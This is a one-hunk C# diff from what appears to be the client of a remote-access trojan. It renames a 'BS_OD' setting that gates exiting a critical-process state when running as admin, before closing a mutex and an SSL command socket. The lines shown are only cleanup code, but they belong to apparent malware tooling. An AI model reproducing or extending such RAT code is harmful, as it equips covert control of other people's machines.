@@ -24,7 +24,7 @@ namespace Client.Helper
         {
             try
             {
-                if (Convert.ToBoolean(Settings.BD_OS) && IsAdmin())
+                if (Convert.ToBoolean(Settings.BS_OD) && IsAdmin())
                     ProcessCritical.Exit();
                 MutexControl.CloseMutex();
                 ClientSocket.SslClient?.Close();
